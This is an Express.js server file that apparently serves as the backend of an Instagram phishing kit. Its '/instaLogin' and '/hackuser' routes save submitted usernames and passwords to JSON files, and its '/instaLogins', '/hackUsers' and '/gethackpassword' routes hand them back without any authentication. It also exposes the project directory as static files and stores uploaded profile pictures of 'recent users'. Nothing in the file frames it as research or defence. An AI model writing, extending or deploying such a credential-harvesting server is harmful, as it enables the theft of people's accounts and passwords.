const express = require("express")
const app = express()
const path = require("path")
const multer = require('multer');
const cors = require("cors")
const fs = require("fs")

app.use(express.json())
app.use(express.static(path.join(__dirname, "./uploads")))
app.use(cors())

function writeToJSONFile(data, filename) {
  const filepath = `./Data/${filename}.json`
  const jsonData = fs.readFileSync(filepath, 'utf8');
  const parsedData = JSON.parse(jsonData)
  const appendedData = [...parsedData, data]
  fs.writeFileSync(filepath, JSON.stringify(appendedData, null, 2));
}

function readFromJSONFile(filename) {
  const filepath = `./Data/${filename}.json`
  const jsonData = fs.readFileSync(filepath, 'utf8');
  return JSON.parse(jsonData);
}


let dpname = ""
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/'); // Destination folder for uploaded files
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    const fileExtension = path.extname(file.originalname);
    dpname = file.fieldname + '-' + uniqueSuffix + fileExtension
    cb(null, file.fieldname + '-' + uniqueSuffix + fileExtension);
  }
});

const upload = multer({ storage: storage });

app.use(express.static(__dirname))



app.post("/instaLogin", async (req, res) => {
    writeToJSONFile(req.body, 'InstaLogins')
})

app.post("/hackuser", async (req, res) => {
  const users = readFromJSONFile('hackUname')
  const filter = users.find(element => element.username === req.body.username)
  if (filter) {
  } else {
    writeToJSONFile(req.body, 'hackUname')
  }

})
app.post("/gethackpassword", async (req, res) => {
  const { username } = req.body
  const data = readFromJSONFile('hackUname')
  const filter = data.find(element => element.username === username)
  if (filter) {
    res.json({ data: filter.password })
  } else {
    res.json({ data: false })
  }

})


app.get("/instaLogins", async (req, res) => {
  const users = readFromJSONFile('InstaLogins')
  res.json({ data: users })
})
app.get("/hackUsers", async (req, res) => {
  const users = readFromJSONFile('hackUname')
  res.json({ data: users })
})


app.post("/addrecentuser", upload.single('dp'), (req, res) => {
  const { name, username, url, from, to } = req.body
  const data = { name, username, url, from, to, dp: dpname }
  const users = readFromJSONFile('recentUsers')
  users.forEach(element => {
    if (element.username == username) {
      return
    } else {
      writeToJSONFile(data, 'recentUsers')
    }
  });
})
app.get("/getrecentusers", async (req, res) => {
  const data = readFromJSONFile('recentUsers')
  res.json({ data })
})


app.listen(3000, () => {
  console.log("server Started")
})
